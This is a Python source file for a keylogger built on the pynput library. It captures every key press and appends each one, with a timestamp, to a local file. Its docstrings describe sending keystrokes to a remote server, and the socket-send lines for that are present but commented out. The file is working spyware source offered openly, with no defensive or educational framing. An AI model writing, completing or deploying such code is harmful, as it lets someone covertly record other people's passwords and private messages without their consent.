# keylogger using pynput module
import os

from pynput.keyboard import Key, Listener, GlobalHotKeys
from datetime import datetime as dt


class KeyLogger:
    """
    a class of key logger that listen to all the keyboard input and send it to the server
    """

    def __init__(self):
        """
        Initiate the key logger and its connection to the server
        :param socket: socket
        :param id: The id of the client it logs
        """
        self.id = id
        self.keys = []
        self.buffer_file_name = 'local_log.txt'

    def append_key_to_file(self, file_name, string):
        print("writing: ", string, " to the file: ", file_name)
        """
        write a list of keys to a text file
        :param keys: list of keys pressed
        :return:
        """
        try:
            with open(file_name, 'a+') as f:
                f.write(string + "\n")
        except:
            print("writing to file failed")

    def run(self):
        """
        start communication with the server and start listening to keyboard input
        """

        with Listener(on_press=self.on_press,
                      on_release=self.on_release) as listener:
            listener.join()

    def on_release(self, key):
        if '\\x' in str(key):
            return

        try:
            print("key pressed")
            """
            Called when key is pressed and sends it to the server
            :param key: the key pressed
            """

            self.keys.append(key)
            # self.write_file(self.keys)

            try:  # try to get the key value and send it to server
                check_key = str(key).replace("'", '')

                if '<' in check_key and '>' in check_key:
                    key_pressed = int(check_key.replace('<', '').replace('>', ''))
                    key_pressed = str(key_pressed - 96)
                else:
                    key_pressed = key.char

                print(key_pressed)
                # self.client_socket.send(self.symmetric_encryption.encrypt(key_pressed.encode()))
                self.append_key_to_file(self.buffer_file_name,
                                        key_pressed + ' @ ' + str(dt.now().strftime('%d/%m/%Y-%H:%M:%S')))
                print('alphanumeric key {0} pressed'.format(key_pressed))

            except AttributeError:  # in case of special key which has no char sign like ENTER or BACKSPACE
                key_string = str(key)
                encoded_key = key_string.replace('Key.', '').encode() if 'Key.' in key_string else key_string.encode()
                # self.client_socket.send(self.symmetric_encryption.encrypt(encoded_key))
                self.append_key_to_file(self.buffer_file_name,
                                        encoded_key.decode() + ' @ ' + str(dt.now().strftime('%d/%m/%Y-%H:%M:%S')))
                print('special key {0} pressed'.format(key))
        except:
            print("sending the pressed key failed.")

    def on_press(self, key):
        pass


def main():
    # logger = KeyLogger()
    # logger.run()
    pass


if __name__ == "__main__":
    main()
